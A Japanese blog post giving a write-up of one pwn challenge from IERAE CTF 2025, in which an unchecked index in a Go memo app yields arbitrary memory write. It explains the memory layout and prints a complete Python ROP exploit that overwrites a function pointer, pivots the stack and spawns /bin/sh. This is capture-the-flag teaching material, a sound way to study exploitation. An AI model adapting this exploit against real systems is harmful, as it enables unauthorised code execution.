<!doctype html><html lang=ja><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="caphosra"><meta name=description content="IERAE CTF 2025に参加したのでwriteupを公開します."><meta name=keywords content="ctf,ierae,ierae ctf 2025,writeup"><meta name=twitter:card content="summary"><meta name=twitter:image content="https://caphosra.net/images/icon.webp"><meta name=twitter:title content="[CTF] IERAE CTF 2025 writeup"><meta name=twitter:description content="IERAE CTF 2025に参加したのでwriteupを公開します."><meta property="og:url" content="https://caphosra.net/posts/2025-06-26-ierae-ctf/"><meta property="og:site_name" content="caphosra note"><meta property="og:title" content="[CTF] IERAE CTF 2025 writeup"><meta property="og:description" content="IERAE CTF 2025に参加したのでwriteupを公開します."><meta property="og:locale" content="ja"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-06-26T17:01:15+09:00"><meta property="article:modified_time" content="2025-06-29T22:33:23+09:00"><meta property="article:tag" content="CTF"><base href=https://caphosra.net/posts/2025-06-26-ierae-ctf/><title>[CTF] IERAE CTF 2025 writeup · caphosra note</title><link rel=canonical href=https://caphosra.net/posts/2025-06-26-ierae-ctf/><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin=anonymous><style defer>@import 'https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;700&display=swap'</style><link rel=stylesheet href=https://caphosra.net/css/coder.min.e785694f058b8c1433bda14011e401202da0cbde72fc8f9e2ec92a230112ba08.css integrity="sha256-54VpTwWLjBQzvaFAEeQBIC2gy95y/I+eLskqIwESugg=" crossorigin=anonymous media=screen><script src=https://cdn.jsdelivr.net/npm/gist-embed@1.0.3/dist/gist-embed.min.js defer></script><link rel=icon type=image/png href=https://caphosra.net/images/logo/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=https://caphosra.net/images/logo/favicon-16x16.png sizes=16x16><meta name=generator content="Hugo 0.148.2"><style type=text/css>.icon{font-size:2.5em}</style></head><body class=colorscheme-light><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://caphosra.net/>caphosra note
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=https://caphosra.net/>About</a></li><li class=navigation-item><a class=navigation-link href=https://caphosra.net/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=https://caphosra.net/tags/>Tags</a></li><li class=navigation-item><a class=navigation-link href=https://caphosra.net/archives/>Archives</a></li><li class=navigation-item><a class=navigation-link href=https://github.com/caphosra>GitHub</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=https://caphosra.net/en/>English</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://caphosra.net/posts/2025-06-26-ierae-ctf/>[CTF] IERAE CTF 2025 writeup</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2025-06-26T17:01:15+09:00>6月 26, 2025
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
2分で読めます</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=https://caphosra.net/tags/ctf/>CTF</a></span></div></div></header><div class=post-content><p>IERAE CTF 2025にTSGとして参加しました。</p><h2 id=pwn-gotcha-go-medium-25-solves>pwn: Gotcha-Go (medium, 25 solves)
<a class=heading-link href=#pwn-gotcha-go-medium-25-solves><i class="fa-solid fa-link" aria-hidden=true title=見出しへのリンク></i>
<span class=sr-only>見出しへのリンク</span></a></h2><p>Go製のメモアプリに対して攻撃を行う問題。メモアプリには特定のIDのメモを作成する(init), 読み込む(info), 書き込む(edit)操作が実装されている。</p><p>脆弱性は明らかで、メモのIDに対してなんの制約も掛かっていないので配列外参照が可能になっている。あとは適当なアドレスを書き換えて終わりだと思っていたが、流石にGo製のアプリだけあって、メモリレイアウトやレジスタの使い方がC言語で同様のコードを書いてgccでコンパイルした時とはかなり違うものとなっていた。</p><p><code>checksec</code>の結果は以下の通り。No PIE, No RELROなのでGOTを書き換えて終わりかと思いきや、C言語と同じようにGOTが存在するわけではないため不可能。</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>$ checksec --file=./ctf
</span></span><span style=display:flex><span>[*] &#39;/ctf/2025/ierae/gotcha-go/ctf&#39;
</span></span><span style=display:flex><span>    Arch:       amd64-64-little
</span></span><span style=display:flex><span>    RELRO:      No RELRO
</span></span><span style=display:flex><span>    Stack:      No canary found
</span></span><span style=display:flex><span>    NX:         NX enabled
</span></span><span style=display:flex><span>    PIE:        No PIE (0x400000)
</span></span><span style=display:flex><span>    Stripped:   No
</span></span><span style=display:flex><span>    Debuginfo:  Yes
</span></span></code></pre></div><p>問題をより詳しく見る。<code>info</code>と<code>edit</code>を使えば任意の<code>idx</code>について以下で定義されるような<code>l</code>に対し、<code>l.list[idx].data</code>に対して読み書きが可能である。</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#76a9f9>type</span> <span style=color:#aa89ea>Data</span> <span style=color:#76a9f9>interface</span> <span style=color:#abb2bf>{</span>
</span></span><span style=display:flex><span>	<span style=color:#00b1f7>info</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>	<span style=color:#00b1f7>init</span><span style=color:#abb2bf>(</span><span style=color:#54b1c7>*</span><span style=color:#aa89ea>MyStr</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>	<span style=color:#00b1f7>edit</span><span style=color:#abb2bf>(</span><span style=color:#e5c07b>int</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>var</span> <span style=color:#aa89ea>l</span> <span style=color:#aa89ea>Data</span> <span style=color:#abb2bf>=</span> <span style=color:#54b1c7>&amp;</span><span style=color:#aa89ea>MyList</span><span style=color:#abb2bf>{}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>type</span> <span style=color:#aa89ea>MyStr</span> <span style=color:#76a9f9>struct</span> <span style=color:#abb2bf>{</span>
</span></span><span style=display:flex><span>	<span style=color:#aa89ea>idx</span>  <span style=color:#e5c07b>int</span>
</span></span><span style=display:flex><span>	<span style=color:#aa89ea>data</span> <span style=color:#abb2bf>[</span><span style=color:#d19a66>0x30</span><span style=color:#abb2bf>]</span><span style=color:#e5c07b>byte</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>type</span> <span style=color:#aa89ea>MyList</span> <span style=color:#76a9f9>struct</span> <span style=color:#abb2bf>{</span>
</span></span><span style=display:flex><span>	<span style=color:#aa89ea>list</span> <span style=color:#abb2bf>[</span><span style=color:#d19a66>16</span><span style=color:#abb2bf>]</span><span style=color:#54b1c7>*</span><span style=color:#aa89ea>MyStr</span>
</span></span><span style=display:flex><span><span style=color:#abb2bf>}</span>
</span></span></code></pre></div><p><code>l</code>はグローバル領域に存在し、毎回固定のアドレスに配置されいること、配列の構造とGhidraでの逆アセンブル結果から、これは要するに任意の<code>idx</code>に対して<code>*(0x56bfc0 + idx * 8) + 0x8</code>のアドレスに対して読み書きができることを意味している。</p><p>また、メモリ上を観察すると、<code>0x56cde0</code>のアドレスの指す先の8だけ先の領域には<code>0x56c188</code>が毎回格納されていることがわかる。これにより、<code>idx = (0x56cde0 - 0x56bfc0) // 8</code>とすれば、<code>0x56c188</code>に対して任意の値を書き込むことができる。あとは、<code>0x56c188</code>に観察したいアドレスから8引いた値を書き込んでから、<code>idx = (0x56c188 - 0x56bfc0) // 8</code>として<code>l.list[idx].data</code>に書き込んだり読み出したりすることで、AAW, AARが可能となる。</p><p>あとはAAWでどこに何を書き込むかである。</p><p>最初は、<code>0xc000000000</code>以降の適当なアドレスに配置されているGoのstackを適当にoverwriteしてROPすることを考えたが、stackのアドレスは実行ごとに変わり、かつstackへのポインタが格納されているグローバル変数が見当たらなかったことから断念した。</p><p>適当にGhidraとgdbをポチポチしていると、<code>l.edit(idx)</code>への関数ポインタが固定のアドレス<code>0x5669c0</code>にあり、それを使って呼び出していることがわかった。AAWもあるので、あとはstack pivotingしてから<code>0xc000000000</code>以降に広がる広大な<code>rw</code>可能な領域を使ってROPをすれば良い。</p><div class=highlight><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8a93a5;font-weight:700;font-style:italic>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>import</span> <span style=color:#ca72ff>sys</span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>from</span> <span style=color:#ca72ff>ptrlib</span> <span style=color:#76a9f9>import</span> <span style=color:#54b1c7>*</span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>import</span> <span style=color:#ca72ff>time</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>REMOTE</span> <span style=color:#54b1c7>=</span> <span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;localhost&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#d19a66>33337</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>EXEC</span> <span style=color:#54b1c7>=</span> <span style=color:#63c381>&#34;./ctf&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>if</span> <span style=color:#e5c07b>len</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>sys</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>argv</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>==</span> <span style=color:#d19a66>1</span><span style=color:#abb2bf>:</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>Process</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>EXEC</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>IS_REMOTE</span> <span style=color:#54b1c7>=</span> <span style=color:#e5c07b>False</span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>else</span><span style=color:#abb2bf>:</span>
</span></span><span style=display:flex><span>    <span style=color:#76a9f9>assert</span> <span style=color:#aa89ea>sys</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>argv</span><span style=color:#abb2bf>[</span><span style=color:#d19a66>1</span><span style=color:#abb2bf>]</span> <span style=color:#54b1c7>==</span> <span style=color:#63c381>&#34;remote&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>host</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>port</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>REMOTE</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>Socket</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>host</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>port</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>IS_REMOTE</span> <span style=color:#54b1c7>=</span> <span style=color:#e5c07b>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>elf</span> <span style=color:#54b1c7>=</span> <span style=color:#aa89ea>ELF</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>EXEC</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8a93a5;font-style:italic># 0x000000000056bfc0 + idx * 8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>input</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;[;] Waiting...&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>base_addr</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>0x56bfc0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>ptr_to_global</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>0x56cde0</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>global_addr</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>0x56c188</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#76a9f9>def</span> <span style=color:#00b1f7>write_addr</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>target_addr</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>value</span><span style=color:#abb2bf>):</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>sendlineafter</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;:</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#63c381>&#34;3&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>sendlineafter</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;:</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#e5c07b>str</span><span style=color:#abb2bf>((</span><span style=color:#aa89ea>ptr_to_global</span> <span style=color:#54b1c7>-</span> <span style=color:#aa89ea>base_addr</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>//</span> <span style=color:#d19a66>8</span><span style=color:#abb2bf>))</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>sendline</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>target_addr</span> <span style=color:#54b1c7>-</span> <span style=color:#d19a66>0x8</span><span style=color:#abb2bf>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>sendlineafter</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;:</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#63c381>&#34;3&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>sendlineafter</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;:</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#e5c07b>str</span><span style=color:#abb2bf>((</span><span style=color:#aa89ea>global_addr</span> <span style=color:#54b1c7>-</span> <span style=color:#aa89ea>base_addr</span><span style=color:#abb2bf>)</span> <span style=color:#54b1c7>//</span> <span style=color:#d19a66>8</span><span style=color:#abb2bf>))</span>
</span></span><span style=display:flex><span>    <span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>send</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>value</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>forged_stack_addr</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>0xc000010000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>=</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;/bin/sh</span><span style=color:#d26464;font-weight:700>\x00\n</span><span style=color:#63c381>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>write_addr</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>forged_stack_addr</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>payload</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>=</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0xdeadbeef</span><span style=color:#abb2bf>)</span> <span style=color:#8a93a5;font-style:italic># dummy</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0x473fc6</span><span style=color:#abb2bf>)</span> <span style=color:#8a93a5;font-style:italic># pop rdi; ret</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>forged_stack_addr</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0x43fec1</span><span style=color:#abb2bf>)</span> <span style=color:#8a93a5;font-style:italic># pop rbx; ret</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>forged_stack_addr</span> <span style=color:#54b1c7>+</span> <span style=color:#d19a66>0x200</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0x46008a</span><span style=color:#abb2bf>)</span> <span style=color:#8a93a5;font-style:italic># pop rsi; shl edx, 0xf; adc [rbx+8], eax; ret</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>write_addr</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>forged_stack_addr</span> <span style=color:#54b1c7>+</span> <span style=color:#d19a66>0x30</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>payload</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>=</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0x499f93</span><span style=color:#abb2bf>)</span> <span style=color:#8a93a5;font-style:italic># pop rax; pop rbp; ret</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>forged_stack_addr</span> <span style=color:#54b1c7>+</span> <span style=color:#d19a66>0x201</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0xdeadbeef</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0x499f20</span><span style=color:#abb2bf>)</span> <span style=color:#8a93a5;font-style:italic># pop rdx; sbb [rax-1], cl; ret</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>write_addr</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>forged_stack_addr</span> <span style=color:#54b1c7>+</span> <span style=color:#d19a66>0x60</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>payload</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>=</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0x499f93</span><span style=color:#abb2bf>)</span> <span style=color:#8a93a5;font-style:italic># pop rax; pop rbp; ret</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>59</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0xdeadbeef</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0x48bf14</span><span style=color:#abb2bf>)</span> <span style=color:#8a93a5;font-style:italic># syscall</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>write_addr</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>forged_stack_addr</span> <span style=color:#54b1c7>+</span> <span style=color:#d19a66>0x90</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>payload</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>forged_stack_addr2</span> <span style=color:#54b1c7>=</span> <span style=color:#d19a66>0xc000018000</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>=</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;A&#34;</span> <span style=color:#54b1c7>*</span> <span style=color:#d19a66>0x18</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>payload</span> <span style=color:#54b1c7>+=</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0x0046d860</span><span style=color:#abb2bf>)</span> <span style=color:#8a93a5;font-style:italic># mov rsp, rbx; pop rbp; ret</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>write_addr</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>forged_stack_addr2</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>payload</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>write_addr</span><span style=color:#abb2bf>(</span><span style=color:#d19a66>0x5669c0</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>p64</span><span style=color:#abb2bf>(</span><span style=color:#aa89ea>forged_stack_addr2</span><span style=color:#abb2bf>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>sendlineafter</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;:</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#63c381>&#34;3&#34;</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>sendlineafter</span><span style=color:#abb2bf>(</span><span style=color:#63c381>&#34;:</span><span style=color:#d26464;font-weight:700>\n</span><span style=color:#63c381>&#34;</span><span style=color:#abb2bf>,</span> <span style=color:#aa89ea>forged_stack_addr</span> <span style=color:#54b1c7>+</span> <span style=color:#d19a66>0x30</span><span style=color:#abb2bf>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#aa89ea>sock</span><span style=color:#54b1c7>.</span><span style=color:#aa89ea>interactive</span><span style=color:#abb2bf>()</span>
</span></span></code></pre></div><p><code>l.edit(idx)</code>呼び出し時の<code>idx</code>が<code>rbx</code>に格納されることを使って、そこを起点に<code>execve("/bin/sh", NULL, NULL)</code>を用意している。静的リンクされているのでガジェットは豊富である。結局AARは使わなかった。</p><h2 id=おわりに>おわりに
<a class=heading-link href=#%e3%81%8a%e3%82%8f%e3%82%8a%e3%81%ab><i class="fa-solid fa-link" aria-hidden=true title=見出しへのリンク></i>
<span class=sr-only>見出しへのリンク</span></a></h2><p>解いたのは以上1問だけです。</p><p>楽しいCTFありがとうございます。力つけて出直してきます。</p></div><footer><div class=comments><script>let getTheme=window.localStorage&&window.localStorage.getItem("colorscheme"),themeInParams="";getTheme==null&&(themeInParams!==""&&themeInParams!=="auto"?getTheme=themeInParams:getTheme=window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");let theme=getTheme==="dark"?"github-dark":"github-light",s=document.createElement("script");s.src="https://utteranc.es/client.js",s.setAttribute("repo","caphosra/caphosra.github.io"),s.setAttribute("issue-term","title"),s.setAttribute("theme",theme),s.setAttribute("crossorigin","anonymous"),s.setAttribute("async",""),document.querySelector("div.comments").innerHTML="",document.querySelector("div.comments").appendChild(s)</script></div></footer></article></section></div><footer class=footer><section class=container><p>Footer? なにそれ美味しいの?</p>© 2019 - 2025
caphosra</section></footer></main></body></html>